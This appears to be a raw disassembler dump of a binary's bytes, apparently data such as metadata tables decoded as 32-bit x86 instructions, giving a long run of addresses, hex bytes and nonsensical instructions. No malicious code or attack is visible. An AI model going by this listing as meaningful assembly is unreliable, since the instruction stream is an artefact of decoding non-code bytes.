  405885:	0a da                	or     %dl,%bl
  405887:	1b 0e                	sbb    (%esi),%ecx
  405889:	00 7b 19             	add    %bh,0x19(%ebx)
  40588c:	da 1b                	ficompl (%ebx)
  40588e:	06                   	push   %es
  40588f:	00 6a 11             	add    %ch,0x11(%edx)
  405892:	3c 0e                	cmp    $0xe,%al
  405894:	06                   	push   %es
  405895:	00 d3                	add    %dl,%bl
  405897:	0a 63 11             	or     0x11(%ebx),%ah
  40589a:	06                   	push   %es
  40589b:	00 81 0a 9b 16 06    	add    %al,0x6169b0a(%ecx)
  4058a1:	00 de                	add    %bl,%dh
  4058a3:	14 9b                	adc    $0x9b,%al
  4058a5:	16                   	push   %ss
  4058a6:	06                   	push   %es
  4058a7:	00 fe                	add    %bh,%dh
  4058a9:	13 9b 16 06 00 91    	adc    -0x6efff9ea(%ebx),%ebx
  4058af:	0c e3                	or     $0xe3,%al
  4058b1:	15 06 00 56 02       	adc    $0x2560006,%eax
  4058b6:	2c 05                	sub    $0x5,%al
  4058b8:	06                   	push   %es
  4058b9:	00 ad 0b 63 11 06    	add    %ch,0x611630b(%ebp)
  4058bf:	00 4b 13             	add    %cl,0x13(%ebx)
  4058c2:	db 04 06             	fildl  (%esi,%eax,1)
  4058c5:	00 cd                	add    %cl,%ch
  4058c7:	12 db                	adc    %bl,%bl
  4058c9:	04 06                	add    $0x6,%al
  4058cb:	00 ef                	add    %ch,%bh
  4058cd:	12 63 11             	adc    0x11(%ebx),%ah
  4058d0:	06                   	push   %es
  4058d1:	00 2c 02             	add    %ch,(%edx,%eax,1)
  4058d4:	63 11                	arpl   %edx,(%ecx)
  4058d6:	06                   	push   %es
  4058d7:	00 d9                	add    %bl,%cl
  4058d9:	12 fc                	adc    %ah,%bh
  4058db:	17                   	pop    %ss
  4058dc:	06                   	push   %es
  4058dd:	00 48 02             	add    %cl,0x2(%eax)
  4058e0:	9b                   	fwait
  4058e1:	16                   	push   %ss
  4058e2:	06                   	push   %es
  4058e3:	00 54 13 db          	add    %dl,-0x25(%ebx,%edx,1)
  4058e7:	04 06                	add    $0x6,%al
  4058e9:	00 ae 1e a5 02 06    	add    %ch,0x602a51e(%esi)
  4058ef:	00 be 02 63 11 06    	add    %bh,0x6116302(%esi)
  4058f5:	00 45 07             	add    %al,0x7(%ebp)
  4058f8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4058f9:	02 0a                	add    (%edx),%cl
  4058fb:	00 91 13 e3 15 06    	add    %dl,0x615e313(%ecx)
  405901:	00 db                	add    %bl,%bl
  405903:	15 63 11 06 00       	adc    $0x61163,%eax
  405908:	cf                   	iret
  405909:	0d 63 11 06 00       	or     $0x61163,%eax
  40590e:	10 19                	adc    %bl,(%ecx)
  405910:	9b                   	fwait
  405911:	16                   	push   %ss
  405912:	06                   	push   %es
  405913:	00 d8                	add    %bl,%al
  405915:	1d 63 11 06 00       	sbb    $0x61163,%eax
  40591a:	6f                   	outsl  %ds:(%esi),(%dx)
  40591b:	08 63 11             	or     %ah,0x11(%ebx)
  40591e:	06                   	push   %es
  40591f:	00 72 10             	add    %dh,0x10(%edx)
  405922:	7c 16                	jl     0x40593a
  405924:	06                   	push   %es
  405925:	00 b1 08 db 04 06    	add    %dh,0x604db08(%ecx)
  40592b:	00 ec                	add    %ch,%ah
  40592d:	1b 63 11             	sbb    0x11(%ebx),%esp
  405930:	47                   	inc    %edi
  405931:	01 22                	add    %esp,(%edx)
  405933:	14 00                	adc    $0x0,%al
  405935:	00 06                	add    %al,(%esi)
  405937:	00 d8                	add    %bl,%al
  405939:	0f db 04 06          	pand   (%esi,%eax,1),%mm0
  40593d:	00 85 1e db 04 06    	add    %al,0x604db1e(%ebp)
  405943:	00 c0                	add    %al,%al
  405945:	12 db                	adc    %bl,%bl
  405947:	04 0a                	add    $0xa,%al
  405949:	00 f1                	add    %dh,%cl
  40594b:	08 e3                	or     %ah,%bl
  40594d:	15 06 00 f4 0e       	adc    $0xef40006,%eax
  405952:	63 11                	arpl   %edx,(%ecx)
  405954:	06                   	push   %es
  405955:	00 1e                	add    %bl,(%esi)
  405957:	06                   	push   %es
  405958:	3c 0e                	cmp    $0xe,%al
  40595a:	0a 00                	or     (%eax),%al
  40595c:	94                   	xchg   %eax,%esp
  40595d:	1d 50 18 06 00       	sbb    $0x61850,%eax
  405962:	2e 1c 63             	cs sbb $0x63,%al
  405965:	11 06                	adc    %eax,(%esi)
  405967:	00 dc                	add    %bl,%ah
  405969:	15 63 11 0e 00       	adc    $0xe1163,%eax
  40596e:	c2 0f da             	ret    $0xda0f
  405971:	1b 0e                	sbb    (%esi),%ecx
  405973:	00 b1 18 da 1b 0a    	add    %dh,0xa1bda18(%ecx)
  405979:	00 a3 12 39 1b 0a    	add    %ah,0xa1b3912(%ebx)
  40597f:	00 31                	add    %dh,(%ecx)
  405981:	1d 39 1b 0a 00       	sbb    $0xa1b39,%eax
  405986:	60                   	pusha
  405987:	0b 39                	or     (%ecx),%edi
  405989:	1b 0a                	sbb    (%edx),%ecx
  40598b:	00 74 12 f0          	add    %dh,-0x10(%edx,%edx,1)
  40598f:	06                   	push   %es
  405990:	06                   	push   %es
  405991:	00 72 0e             	add    %dh,0xe(%edx)
  405994:	18 1d 06 00 42 11    	sbb    %bl,0x11420006
  40599a:	db 04 06             	fildl  (%esi,%eax,1)
  40599d:	00 f3                	add    %dh,%bl
  40599f:	13 db                	adc    %ebx,%ebx
  4059a1:	04 06                	add    $0x6,%al
  4059a3:	00 52 08             	add    %dl,0x8(%edx)
  4059a6:	63 11                	arpl   %edx,(%ecx)
  4059a8:	0a 00                	or     (%eax),%al
  4059aa:	0f 09                	wbinvd
  4059ac:	e3 15                	jecxz  0x4059c3
  4059ae:	06                   	push   %es
  4059af:	00 37                	add    %dh,(%edi)
  4059b1:	14 e3                	adc    $0xe3,%al
  4059b3:	15 06 00 f3 02       	adc    $0x2f30006,%eax
  4059b8:	63 11                	arpl   %edx,(%ecx)
  4059ba:	12 00                	adc    (%eax),%al
  4059bc:	3a 08                	cmp    (%eax),%cl
  4059be:	cd 13                	int    $0x13
  4059c0:	06                   	push   %es
  4059c1:	00 33                	add    %dh,(%ebx)
  4059c3:	02 2c 05 0a 00 0f 0f 	add    0xf0f000a(,%eax,1),%ch
  4059ca:	e3 15                	jecxz  0x4059e1
  4059cc:	0a 00                	or     (%eax),%al
  4059ce:	45                   	inc    %ebp
  4059cf:	1a 14 12             	sbb    (%edx,%edx,1),%dl
  4059d2:	06                   	push   %es
  4059d3:	00 b5 02 63 11 0a    	add    %dh,0xa116302(%ebp)
  4059d9:	00 12                	add    %dl,(%edx)
  4059db:	1e                   	push   %ds
  4059dc:	72 1a                	jb     0x4059f8
  4059de:	0a 00                	or     (%eax),%al
  4059e0:	09 0b                	or     %ecx,(%ebx)
  4059e2:	72 1a                	jb     0x4059fe
  4059e4:	0a 00                	or     (%eax),%al
  4059e6:	eb 0a                	jmp    0x4059f2
  4059e8:	72 1a                	jb     0x405a04
  4059ea:	06                   	push   %es
  4059eb:	00 02                	add    %al,(%edx)
  4059ed:	15 db 04 0a 00       	adc    $0xa04db,%eax
  4059f2:	43                   	inc    %ebx
  4059f3:	18 39                	sbb    %bh,(%ecx)
  4059f5:	1b 0a                	sbb    (%edx),%ecx
  4059f7:	00 8f 1e 39 1b 06    	add    %cl,0x61b391e(%edi)
  4059fd:	00 d9                	add    %bl,%cl
  4059ff:	13 63 11             	adc    0x11(%ebx),%esp
  405a02:	0a 00                	or     (%eax),%al
  405a04:	9a 1a 14 12 06 00 5f 	lcall  $0x5f00,$0x612141a
  405a0b:	17                   	pop    %ss
  405a0c:	db 04 06             	fildl  (%esi,%eax,1)
  405a0f:	00 33                	add    %dh,(%ebx)
  405a11:	13 63 11             	adc    0x11(%ebx),%esp
  405a14:	06                   	push   %es
  405a15:	00 d3                	add    %dl,%bl
  405a17:	1e                   	push   %ds
  405a18:	7a 10                	jp     0x405a2a
  405a1a:	06                   	push   %es
  405a1b:	00 94 10 7a 10 06 00 	add    %dl,0x6107a(%eax,%edx,1)
  405a22:	bf 08 7a 10 06       	mov    $0x6107a08,%edi
  405a27:	00 d2                	add    %dl,%dl
  405a29:	08 63 11             	or     %ah,0x11(%ebx)
  405a2c:	06                   	push   %es
  405a2d:	00 3a                	add    %bh,(%edx)
  405a2f:	15 63 11 06 00       	adc    $0x61163,%eax
  405a34:	d3 15 3c 0e 06 00    	rcll   %cl,0x60e3c
  405a3a:	e1 0a                	loope  0x405a46
  405a3c:	db 04 06             	fildl  (%esi,%eax,1)
  405a3f:	00 a2 13 db 04 06    	add    %ah,0x604db13(%edx)
  405a45:	00 74 13 db          	add    %dh,-0x25(%ebx,%edx,1)
  405a49:	04 0e                	add    $0xe,%al
  405a4b:	00 d1                	add    %dl,%cl
  405a4d:	10 da                	adc    %bl,%dl
  405a4f:	1b 0e                	sbb    (%esi),%ecx
  405a51:	00 bd 10 da 1b 0e    	add    %bh,0xe1bda10(%ebp)
  405a57:	00 c2                	add    %al,%dl
  405a59:	18 da                	sbb    %bl,%dl
  405a5b:	1b 0e                	sbb    (%esi),%ecx
  405a5d:	00 8b 18 da 1b 06    	add    %cl,0x61bda18(%ebx)
  405a63:	00 41 02             	add    %al,0x2(%ecx)
  405a66:	fc                   	cld
  405a67:	17                   	pop    %ss
  405a68:	06                   	push   %es
  405a69:	00 5e 13             	add    %bl,0x13(%esi)
  405a6c:	5b                   	pop    %ebx
  405a6d:	16                   	push   %ss
  405a6e:	00 00                	add    %al,(%eax)
  405a70:	00 00                	add    %al,(%eax)
  405a72:	27                   	daa
  405a73:	04 00                	add    $0x0,%al
  405a75:	00 00                	add    %al,(%eax)
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 01                	add    %al,(%ecx)
  405a7b:	00 81 01 10 00 ed    	add    %al,-0x12ffefff(%ecx)
  405a81:	11 00                	adc    %eax,(%eax)
  405a83:	00 4d 00             	add    %cl,0x0(%ebp)
  405a86:	01 00                	add    %eax,(%eax)
  405a88:	01 00                	add    %eax,(%eax)
  405a8a:	81 01 10 00 a9 19    	addl   $0x19a90010,(%ecx)
  405a90:	00 00                	add    %al,(%eax)
  405a92:	4d                   	dec    %ebp
  405a93:	00 01                	add    %al,(%ecx)
  405a95:	00 02                	add    %al,(%edx)
  405a97:	00 81 01 10 00 49    	add    %al,0x49001001(%ecx)
  405a9d:	1e                   	push   %ds
  405a9e:	00 00                	add    %al,(%eax)
  405aa0:	4d                   	dec    %ebp
  405aa1:	00 01                	add    %al,(%ecx)
  405aa3:	00 06                	add    %al,(%esi)
  405aa5:	00 81 01 10 00 95    	add    %al,-0x6affefff(%ecx)
  405aab:	19 00                	sbb    %eax,(%eax)
  405aad:	00 4d 00             	add    %cl,0x0(%ebp)
  405ab0:	01 00                	add    %eax,(%eax)
  405ab2:	07                   	pop    %es
  405ab3:	00 81 01 10 00 1b    	add    %al,0x1b001001(%ecx)
  405ab9:	11 00                	adc    %eax,(%eax)
  405abb:	00 4d 00             	add    %cl,0x0(%ebp)
  405abe:	01 00                	add    %eax,(%eax)
  405ac0:	09 00                	or     %eax,(%eax)
  405ac2:	81 01 10 00 39 06    	addl   $0x6390010,(%ecx)
  405ac8:	00 00                	add    %al,(%eax)
  405aca:	4d                   	dec    %ebp
  405acb:	00 01                	add    %al,(%ecx)
  405acd:	00 0b                	add    %cl,(%ebx)
  405acf:	00 01                	add    %al,(%ecx)
  405ad1:	00 10                	add    %dl,(%eax)
  405ad3:	00 44 13 00          	add    %al,0x0(%ebx,%edx,1)
  405ad7:	00 4d 00             	add    %cl,0x0(%ebp)
  405ada:	03 00                	add    (%eax),%eax
  405adc:	0f 00 81 01 10 00 06 	sldt   0x6001001(%ecx)
  405ae3:	10 00                	adc    %al,(%eax)
  405ae5:	00 4d 00             	add    %cl,0x0(%ebp)
  405ae8:	07                   	pop    %es
  405ae9:	00 18                	add    %bl,(%eax)
  405aeb:	00 81 01 10 00 b4    	add    %al,-0x4bffefff(%ecx)
  405af1:	19 00                	sbb    %eax,(%eax)
  405af3:	00 4d 00             	add    %cl,0x0(%ebp)
  405af6:	07                   	pop    %es
  405af7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405afa:	81 01 10 00 c9 07    	addl   $0x7c90010,(%ecx)
  405b00:	00 00                	add    %al,(%eax)
  405b02:	4d                   	dec    %ebp
  405b03:	00 07                	add    %al,(%edi)
  405b05:	00 20                	add    %ah,(%eax)
  405b07:	00 81 01 10 00 d5    	add    %al,-0x2affefff(%ecx)
  405b0d:	19 00                	sbb    %eax,(%eax)
  405b0f:	00 4d 00             	add    %cl,0x0(%ebp)
  405b12:	07                   	pop    %es
  405b13:	00 21                	add    %ah,(%ecx)
  405b15:	00 81 01 10 00 56    	add    %al,0x56001001(%ecx)
  405b1b:	04 00                	add    $0x0,%al
  405b1d:	00 4d 00             	add    %cl,0x0(%ebp)
  405b20:	08 00                	or     %al,(%eax)
  405b22:	24 00                	and    $0x0,%al
  405b24:	81 01 10 00 8b 19    	addl   $0x198b0010,(%ecx)
  405b2a:	00 00                	add    %al,(%eax)
  405b2c:	4d                   	dec    %ebp
  405b2d:	00 09                	add    %cl,(%ecx)
  405b2f:	00 27                	add    %ah,(%edi)
  405b31:	00 80 01 10 00 05    	add    %al,0x5001001(%eax)
  405b37:	0f 7f 11             	movq   %mm2,(%ecx)
  405b3a:	4d                   	dec    %ebp
  405b3b:	00 09                	add    %cl,(%ecx)
  405b3d:	00 28                	add    %ch,(%eax)
  405b3f:	00 80 01 10 00 79    	add    %al,0x79001001(%eax)
  405b45:	07                   	pop    %es
  405b46:	7f 11                	jg     0x405b59
  405b48:	4d                   	dec    %ebp
  405b49:	00 0e                	add    %cl,(%esi)
  405b4b:	00 33                	add    %dh,(%ebx)
  405b4d:	00 80 01 10 00 2f    	add    %al,0x2f001001(%eax)
  405b53:	06                   	push   %es
  405b54:	7f 11                	jg     0x405b67
  405b56:	4d                   	dec    %ebp
  405b57:	00 0f                	add    %cl,(%edi)
  405b59:	00 37                	add    %dh,(%edi)
  405b5b:	00 80 01 10 00 cc    	add    %al,-0x33ffefff(%eax)
  405b61:	07                   	pop    %es
  405b62:	7f 11                	jg     0x405b75
  405b64:	4d                   	dec    %ebp
  405b65:	00 17                	add    %dl,(%edi)
  405b67:	00 42 00             	add    %al,0x0(%edx)
  405b6a:	80 01 10             	addb   $0x10,(%ecx)
  405b6d:	00 49 11             	add    %cl,0x11(%ecx)
  405b70:	7f 11                	jg     0x405b83
  405b72:	4d                   	dec    %ebp
  405b73:	00 1a                	add    %bl,(%edx)
  405b75:	00 4a 00             	add    %cl,0x0(%edx)
  405b78:	80 01 10             	addb   $0x10,(%ecx)
  405b7b:	00 7e 15             	add    %bh,0x15(%esi)
  405b7e:	7f 11                	jg     0x405b91
  405b80:	4d                   	dec    %ebp
  405b81:	00 1b                	add    %bl,(%ebx)
  405b83:	00 4d 00             	add    %cl,0x0(%ebp)
  405b86:	80 01 10             	addb   $0x10,(%ecx)
  405b89:	00 ff                	add    %bh,%bh
  405b8b:	0f 7f 11             	movq   %mm2,(%ecx)
  405b8e:	4d                   	dec    %ebp
  405b8f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405b92:	50                   	push   %eax
  405b93:	00 80 01 10 00 60    	add    %al,0x60001001(%eax)
  405b99:	0e                   	push   %cs
  405b9a:	7f 11                	jg     0x405bad
  405b9c:	4d                   	dec    %ebp
  405b9d:	00 1f                	add    %bl,(%edi)
  405b9f:	00 55 00             	add    %dl,0x0(%ebp)
  405ba2:	80 01 10             	addb   $0x10,(%ecx)
  405ba5:	00 25 06 7f 11 4d    	add    %ah,0x4d117f06
  405bab:	00 23                	add    %ah,(%ebx)
  405bad:	00 5b 00             	add    %bl,0x0(%ebx)
  405bb0:	00 01                	add    %al,(%ecx)
  405bb2:	00 00                	add    %al,(%eax)
  405bb4:	37                   	aaa
  405bb5:	04 00                	add    $0x0,%al
  405bb7:	00 4d 00             	add    %cl,0x0(%ebp)
  405bba:	23 00                	and    (%eax),%eax
  405bbc:	5d                   	pop    %ebp
  405bbd:	00 03                	add    %al,(%ebx)
  405bbf:	01 10                	add    %edx,(%eax)
  405bc1:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405bc4:	00 00                	add    %al,(%eax)
  405bc6:	4d                   	dec    %ebp
  405bc7:	00 25 00 5d 00 03    	add    %ah,0x3005d00
  405bcd:	01 10                	add    %edx,(%eax)
  405bcf:	00 01                	add    %al,(%ecx)
  405bd1:	00 00                	add    %al,(%eax)
  405bd3:	00 4d 00             	add    %cl,0x0(%ebp)
  405bd6:	27                   	daa
  405bd7:	00 5f 00             	add    %bl,0x0(%edi)
  405bda:	03 01                	add    (%ecx),%eax
  405bdc:	10 00                	adc    %al,(%eax)
  405bde:	9c                   	pushf
  405bdf:	00 00                	add    %al,(%eax)
  405be1:	00 4d 00             	add    %cl,0x0(%ebp)
  405be4:	29 00                	sub    %eax,(%eax)
  405be6:	62 00                	bound  %eax,(%eax)
  405be8:	03 01                	add    (%ecx),%eax
  405bea:	10 00                	adc    %al,(%eax)
  405bec:	ce                   	into
  405bed:	00 00                	add    %al,(%eax)
  405bef:	00 4d 00             	add    %cl,0x0(%ebp)
  405bf2:	2a 00                	sub    (%eax),%al
  405bf4:	64 00 03             	add    %al,%fs:(%ebx)
  405bf7:	01 10                	add    %edx,(%eax)
  405bf9:	00 e3                	add    %ah,%bl
  405bfb:	00 00                	add    %al,(%eax)
  405bfd:	00 4d 00             	add    %cl,0x0(%ebp)
  405c00:	2b 00                	sub    (%eax),%eax
  405c02:	66 00 03             	data16 add %al,(%ebx)
  405c05:	21 10                	and    %edx,(%eax)
  405c07:	00 24 05 00 00 4d 00 	add    %ah,0x4d0000(,%eax,1)
  405c0e:	2d 00 69 00 03       	sub    $0x3006900,%eax
  405c13:	01 10                	add    %edx,(%eax)
  405c15:	00 71 00             	add    %dh,0x0(%ecx)
  405c18:	00 00                	add    %al,(%eax)
  405c1a:	4d                   	dec    %ebp
  405c1b:	00 2f                	add    %ch,(%edi)
  405c1d:	00 6c 00 03          	add    %ch,0x3(%eax,%eax,1)
  405c21:	01 10                	add    %edx,(%eax)
  405c23:	00 ce                	add    %cl,%dh
  405c25:	00 00                	add    %al,(%eax)
  405c27:	00 4d 00             	add    %cl,0x0(%ebp)
  405c2a:	31 00                	xor    %eax,(%eax)
  405c2c:	6e                   	outsb  %ds:(%esi),(%dx)
  405c2d:	00 03                	add    %al,(%ebx)
  405c2f:	01 10                	add    %edx,(%eax)
  405c31:	00 ba 01 00 00 4d    	add    %bh,0x4d000001(%edx)
  405c37:	00 33                	add    %dh,(%ebx)
  405c39:	00 6f 00             	add    %ch,0x0(%edi)
  405c3c:	03 01                	add    (%ecx),%eax
  405c3e:	10 00                	adc    %al,(%eax)
  405c40:	d0 03                	rolb   $1,(%ebx)
  405c42:	00 00                	add    %al,(%eax)
  405c44:	e1 00                	loope  0x405c46
  405c46:	35 00 71 00 03       	xor    $0x3007100,%eax
  405c4b:	01 10                	add    %edx,(%eax)
  405c4d:	00 8a 03 00 00 e1    	add    %cl,-0x1efffffd(%edx)
  405c53:	00 3d 00 73 00 03    	add    %bh,0x3007300
  405c59:	21 10                	and    %edx,(%eax)
  405c5b:	00 24 05 00 00 4d 00 	add    %ah,0x4d0000(,%eax,1)
  405c62:	42                   	inc    %edx
  405c63:	00 75 00             	add    %dh,0x0(%ebp)
  405c66:	03 01                	add    (%ecx),%eax
  405c68:	10 00                	adc    %al,(%eax)
  405c6a:	1a 02                	sbb    (%edx),%al
  405c6c:	00 00                	add    %al,(%eax)
  405c6e:	e1 00                	loope  0x405c70
  405c70:	44                   	inc    %esp
  405c71:	00 78 00             	add    %bh,0x0(%eax)
  405c74:	03 21                	add    (%ecx),%esp
  405c76:	10 00                	adc    %al,(%eax)
  405c78:	24 05                	and    $0x5,%al
  405c7a:	00 00                	add    %al,(%eax)
  405c7c:	4d                   	dec    %ebp
  405c7d:	00 47 00             	add    %al,0x0(%edi)
  405c80:	7a 00                	jp     0x405c82
  405c82:	03 01                	add    (%ecx),%eax
  405c84:	10 00                	adc    %al,(%eax)
  405c86:	6c                   	insb   (%dx),%es:(%edi)
  405c87:	03 00                	add    (%eax),%eax
  405c89:	00 e1                	add    %ah,%cl
  405c8b:	00 49 00             	add    %cl,0x0(%ecx)
  405c8e:	7d 00                	jge    0x405c90
  405c90:	03 21                	add    (%ecx),%esp
  405c92:	10 00                	adc    %al,(%eax)
  405c94:	24 05                	and    $0x5,%al
  405c96:	00 00                	add    %al,(%eax)
  405c98:	4d                   	dec    %ebp
  405c99:	00 4e 00             	add    %cl,0x0(%esi)
  405c9c:	7f 00                	jg     0x405c9e
  405c9e:	03 01                	add    (%ecx),%eax
  405ca0:	10 00                	adc    %al,(%eax)
  405ca2:	87 00                	xchg   %eax,(%eax)
  405ca4:	00 00                	add    %al,(%eax)
  405ca6:	4d                   	dec    %ebp
  405ca7:	00 50 00             	add    %dl,0x0(%eax)
  405caa:	82 00 03             	addb   $0x3,(%eax)
  405cad:	01 10                	add    %edx,(%eax)
  405caf:	00 b1 03 00 00 e1    	add    %dh,-0x1efffffd(%ecx)
  405cb5:	00 51 00             	add    %dl,0x0(%ecx)
  405cb8:	84 00                	test   %al,(%eax)
  405cba:	15 01 00 00 0b       	adc    $0xb000001,%eax
  405cbf:	03 00                	add    (%eax),%eax
  405cc1:	00 e1                	add    %ah,%cl
  405cc3:	00 56 00             	add    %dl,0x0(%esi)
  405cc6:	86 00                	xchg   %al,(%eax)
  405cc8:	15 01 00 00 7e       	adc    $0x7e000001,%eax
  405ccd:	02 00                	add    (%eax),%al
  405ccf:	00 e1                	add    %ah,%cl
  405cd1:	00 56 00             	add    %dl,0x0(%esi)
  405cd4:	86 00                	xchg   %al,(%eax)
  405cd6:	03 01                	add    (%ecx),%eax
  405cd8:	10 00                	adc    %al,(%eax)
  405cda:	e1 05                	loope  0x405ce1
  405cdc:	00 00                	add    %al,(%eax)
  405cde:	e1 00                	loope  0x405ce0
  405ce0:	56                   	push   %esi
  405ce1:	00 86 00 03 01 10    	add    %al,0x10010300(%esi)
  405ce7:	00 b6 05 00 00 e1    	add    %dh,-0x1efffffb(%esi)
  405ced:	00 5e 00             	add    %bl,0x0(%esi)
  405cf0:	88 00                	mov    %al,(%eax)
  405cf2:	03 01                	add    (%ecx),%eax
  405cf4:	10 00                	adc    %al,(%eax)
  405cf6:	c7 05 00 00 e1 00 62 	movl   $0x8a0062,0xe10000
  405cfd:	00 8a 00 
  405d00:	11 00                	adc    %eax,(%eax)
  405d02:	57                   	push   %edi
  405d03:	07                   	pop    %es
  405d04:	b0 07                	mov    $0x7,%al
  405d06:	11 00                	adc    %eax,(%eax)
  405d08:	c0 0e b4             	rorb   $0xb4,(%esi)
  405d0b:	07                   	pop    %es
  405d0c:	51                   	push   %ecx
  405d0d:	80 e5 04             	and    $0x4,%ch
  405d10:	b7 07                	mov    $0x7,%bh
  405d12:	51                   	push   %ecx
  405d13:	80 07 05             	addb   $0x5,(%edi)
  405d16:	b7 07                	mov    $0x7,%bh
  405d18:	51                   	push   %ecx
  405d19:	80 71 04 b7          	xorb   $0xb7,0x4(%ecx)
  405d1d:	07                   	pop    %es
  405d1e:	51                   	push   %ecx
  405d1f:	80 5a 04 b7          	sbbb   $0xb7,0x4(%edx)
  405d23:	07                   	pop    %es
  405d24:	51                   	push   %ecx
  405d25:	80 f8 04             	cmp    $0x4,%al
  405d28:	b7 07                	mov    $0x7,%bh
  405d2a:	11 00                	adc    %eax,(%eax)
  405d2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405d2d:	14 ba                	adc    $0xba,%al
  405d2f:	07                   	pop    %es
  405d30:	31 00                	xor    %eax,(%eax)
  405d32:	1d 17 be 07 31       	sbb    $0x3107be17,%eax
  405d37:	00 50 19             	add    %dl,0x19(%eax)
  405d3a:	be 07 31 00 1f       	mov    $0x1f003107,%esi
  405d3f:	19 be 07 31 00 2d    	sbb    %edi,0x2d003107(%esi)
  405d45:	18 be 07 31 00 ba    	sbb    %bh,-0x45ffcef9(%esi)
  405d4b:	17                   	pop    %ss
  405d4c:	be 07 31 00 de       	mov    $0xde003107,%esi
  405d51:	18 be 07 31 00 57    	sbb    %bh,0x57003107(%esi)
  405d57:	07                   	pop    %es
  405d58:	b0 07                	mov    $0x7,%al
  405d5a:	31 00                	xor    %eax,(%eax)
  405d5c:	32 17                	xor    (%edi),%dl
  405d5e:	be 07 51 80 13       	mov    $0x13805107,%esi
  405d63:	18 c2                	sbb    %al,%dl
  405d65:	07                   	pop    %es
  405d66:	51                   	push   %ecx
  405d67:	80 36 1c             	xorb   $0x1c,(%esi)
  405d6a:	c2 07 11             	ret    $0x1107
  405d6d:	00 6e 1a             	add    %ch,0x1a(%esi)
  405d70:	c5 07                	lds    (%edi),%eax
  405d72:	11 00                	adc    %eax,(%eax)
  405d74:	bc 14 20 04 11       	mov    $0x11042014,%esp
  405d79:	00 71 19             	add    %dh,0x19(%ecx)
  405d7c:	20 04 31             	and    %al,(%ecx,%esi,1)
  405d7f:	00 58 1b             	add    %bl,0x1b(%eax)
  405d82:	ca 07 31             	lret   $0x3107
  405d85:	00 f2                	add    %dh,%dl
  405d87:	18 be 07 31 00 c9    	sbb    %bh,-0x36ffcef9(%esi)
  405d8d:	09 20                	or     %esp,(%eax)
  405d8f:	04 11                	add    $0x11,%al
  405d91:	00 57 07             	add    %dl,0x7(%edi)
  405d94:	b0 07                	mov    $0x7,%al
  405d96:	31 00                	xor    %eax,(%eax)
  405d98:	57                   	push   %edi
  405d99:	07                   	pop    %es
  405d9a:	b0 07                	mov    $0x7,%al
  405d9c:	31 00                	xor    %eax,(%eax)
  405d9e:	e6 17                	out    %al,$0x17
  405da0:	be 07 31 00 57       	mov    $0x57003107,%esi
  405da5:	07                   	pop    %es
  405da6:	b0 07                	mov    $0x7,%al
  405da8:	11 00                	adc    %eax,(%eax)
  405daa:	9d                   	popf
  405dab:	0e                   	push   %cs
  405dac:	b4 07                	mov    $0x7,%ah
  405dae:	11 00                	adc    %eax,(%eax)
  405db0:	6e                   	outsb  %ds:(%esi),(%dx)
  405db1:	1a c5                	sbb    %ch,%al
  405db3:	07                   	pop    %es
  405db4:	31 00                	xor    %eax,(%eax)
  405db6:	4b                   	dec    %ebx
  405db7:	0f 20 04             	mov    %cr0,%esp
  405dba:	31 00                	xor    %eax,(%eax)
  405dbc:	57                   	push   %edi
  405dbd:	07                   	pop    %es
  405dbe:	b0 07                	mov    $0x7,%al
  405dc0:	31 00                	xor    %eax,(%eax)
  405dc2:	02 19                	add    (%ecx),%bl
  405dc4:	be 07 11 00 6e       	mov    $0x6e001107,%esi
  405dc9:	1a c5                	sbb    %ch,%al
  405dcb:	07                   	pop    %es
  405dcc:	33 01                	xor    (%ecx),%eax
  405dce:	7d 04                	jge    0x405dd4
  405dd0:	ce                   	into
  405dd1:	07                   	pop    %es
  405dd2:	33 01                	xor    (%ecx),%eax
  405dd4:	e2 03                	loop   0x405dd9
  405dd6:	d3 07                	roll   %cl,(%edi)
  405dd8:	06                   	push   %es
  405dd9:	00 41 07             	add    %al,0x7(%ecx)
  405ddc:	d8 07                	fadds  (%edi)
  405dde:	06                   	push   %es
  405ddf:	00 f8                	add    %bh,%al
  405de1:	00 dc                	add    %bl,%ah
  405de3:	07                   	pop    %es
  405de4:	06                   	push   %es
  405de5:	00 de                	add    %bl,%dh
  405de7:	13 20                	adc    (%eax),%esp
  405de9:	04 06                	add    $0x6,%al
  405deb:	00 28                	add    %ch,(%eax)
  405ded:	05 20 04 06 00       	add    $0x60420,%eax
  405df2:	f2 09 20             	repnz or %esp,(%eax)
  405df5:	04 06                	add    $0x6,%al
  405df7:	00 f2                	add    %dh,%dl
  405df9:	09 20                	or     %esp,(%eax)
  405dfb:	04 06                	add    $0x6,%al
  405dfd:	00 af 14 20 04 06    	add    %ch,0x6042014(%edi)
  405e03:	00 b7 10 20 04 36    	add    %dh,0x36042010(%edi)
  405e09:	00 23                	add    %ah,(%ebx)
  405e0b:	04 e0                	add    $0xe0,%al
  405e0d:	07                   	pop    %es
  405e0e:	16                   	push   %ss
  405e0f:	00 b1 00 e4 07 06    	add    %dh,0x607e400(%ecx)
  405e15:	00 bb 13 20 04 06    	add    %bh,0x6042013(%ebx)
  405e1b:	00 56 0f             	add    %dl,0xf(%esi)
  405e1e:	20 04 06             	and    %al,(%esi,%eax,1)
  405e21:	00 f0                	add    %dh,%al
  405e23:	07                   	pop    %es
  405e24:	20 04 06             	and    %al,(%esi,%eax,1)
  405e27:	00 59 14             	add    %bl,0x14(%ecx)
  405e2a:	e9 07 06 00 bb       	jmp    0xbb406436
  405e2f:	13 20                	adc    (%eax),%esp
  405e31:	04 06                	add    $0x6,%al
  405e33:	00 6e 02             	add    %ch,0x2(%esi)
  405e36:	ee                   	out    %al,(%dx)
  405e37:	07                   	pop    %es
  405e38:	06                   	push   %es
  405e39:	00 8a 0b c2 07 06    	add    %cl,0x607c20b(%edx)
  405e3f:	00 15 14 f3 07 01    	add    %dl,0x107f314
  405e45:	00 cf                	add    %cl,%bh
  405e47:	01 ee                	add    %ebp,%esi
  405e49:	07                   	pop    %es
  405e4a:	01 00                	add    %eax,(%eax)
  405e4c:	ec                   	in     (%dx),%al
  405e4d:	02 f8                	add    %al,%bh
  405e4f:	07                   	pop    %es
  405e50:	01 00                	add    %eax,(%eax)
  405e52:	d2 02                	rolb   %cl,(%edx)
  405e54:	20 04 01             	and    %al,(%ecx,%eax,1)
  405e57:	00 39                	add    %bh,(%ecx)
  405e59:	03 fd                	add    %ebp,%edi
  405e5b:	07                   	pop    %es
